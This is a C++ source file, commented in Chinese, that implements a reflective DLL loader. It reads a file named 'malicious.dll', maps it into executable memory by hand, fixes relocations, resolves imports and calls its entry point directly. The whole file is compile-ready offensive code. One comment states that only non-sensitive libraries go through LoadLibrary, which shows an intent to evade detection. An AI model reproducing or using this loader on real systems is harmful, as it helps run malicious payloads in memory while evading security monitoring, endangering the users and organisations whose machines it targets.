#include <Windows.h>
#include <stdio.h>

typedef struct BASE_RELOCATION_BLOCK {
    DWORD PageAddress;
    DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

using DLLEntry = BOOL(WINAPI*)(HINSTANCE dll, DWORD reason, LPVOID reserved);

int main()
{
    /////////////////////////////////////////

    // 将dll文件读入到此进程的内存中
    /////////////////////////////////////////
    // 读取dll文件
    HANDLE hdll = CreateFileA("C:/users/user/desktop/malicious.dll", GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
    DWORD64 dllSize = GetFileSize(hdll, NULL);
    LPVOID dllBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllSize);
    ReadFile(hdll, dllBytes, dllSize, NULL, NULL);

    // 解析dll的IMAGE_DOS_HEADER和IMAGE_NT_HEADERS并获取dll映像大小
    PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dllBytes;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders->e_lfanew);
    SIZE_T dllImageSize = ntHeaders->OptionalHeader.SizeOfImage;

    // 将dll的内容写入全新分配的内存空间中
    LPVOID dllBase = VirtualAlloc((LPVOID)ntHeaders->OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(GetCurrentProcess(), dllBase, dllBytes, ntHeaders->OptionalHeader.SizeOfHeaders, NULL);
    
    // 开始对所有IMAGE_SECTION进行处理，根据增量挨个复制
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (size_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
    {
        LPVOID sectionDestination = (LPVOID)((DWORD_PTR)section->VirtualAddress + (DWORD_PTR)dllBase);
        LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)section->PointerToRawData);
        WriteProcessMemory(GetCurrentProcess(), sectionDestination, sectionBytes, section->SizeOfRawData, NULL);
        section++;
    }
    /////////////////////////////////////////

    // 利用重定位表对内存地址进行修正
    /////////////////////////////////////////
    IMAGE_DATA_DIRECTORY relocations = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)dllBase;
    DWORD relocationsProcessed = 0;
    
    // 求出原地址到目标地址的增量
    DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;

    while (relocationsProcessed < relocations.Size)
    {
        PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
        relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
        DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
        PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);

        for (DWORD i = 0; i < relocationsCount; i++)
        {
            relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);

            if (relocationEntries[i].Type == 0)
            {
                continue;
            }

            DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
            DWORD_PTR addressToPatch = 0;

            // 根据增量对每块的内容进行转移
            ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);
            addressToPatch += deltaImageBase;
            WriteProcessMemory(GetCurrentProcess(), (PVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);
        }
    }
    /////////////////////////////////////////

    // 使用IAT的方法来挨个加载其他的、不是特别敏感的dll文件
    /////////////////////////////////////////
    IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBase);
    LPCSTR libraryName = "";
    HMODULE library = NULL;

    // 若存在其他需要加载的dll文件
    while (importDescriptor->Name != NULL)
    {
        // 使用LoadLibrary函数来加载对应的dll文件（LoadLibrary是为了方便？不过这里一般也就加载些普通的dll文件吧，不敏感）
        
        libraryName = (LPCSTR)importDescriptor->Name + (DWORD_PTR)dllBase;
        library = LoadLibraryA(libraryName);

        if (library)
        {
            // thunk是指向IAT的指针
            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(importDescriptor->FirstThunk + (DWORD_PTR)dllBase);

            // 若存在需要导入的函数
            while (thunk->u1.AddressOfData != NULL)
            {
                // 按照序数Ordinal导入相应函数
                if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
                {
                    LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
                    thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);
                }
                else
                {
                    // 按照函数名称导入相应函数
                    PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)(thunk->u1.AddressOfData + (DWORD_PTR)dllBase);
                    DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, (LPCSTR)functionName->Name);
                    //printf("IAT Resolving 0x%p -> 0x%p\n", thunk->u1.Function + (DWORD_PTR)dllBase ,functionAddress);
                    thunk->u1.Function = functionAddress;
                }
                ++thunk;
            }
        }

        importDescriptor++;
    }
    /////////////////////////////////////////

    // 反射执行dll中的函数功能
    /////////////////////////////////////////
    DLLEntry DllEntry = (DLLEntry)(ntHeaders->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)dllBase);
    (*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);

    // 结束并释放
    CloseHandle(hdll);
    HeapFree(GetProcessHeap(), 0, dllBytes);
    return 0;
}

// g++ reflective.cpp -o reflective.exe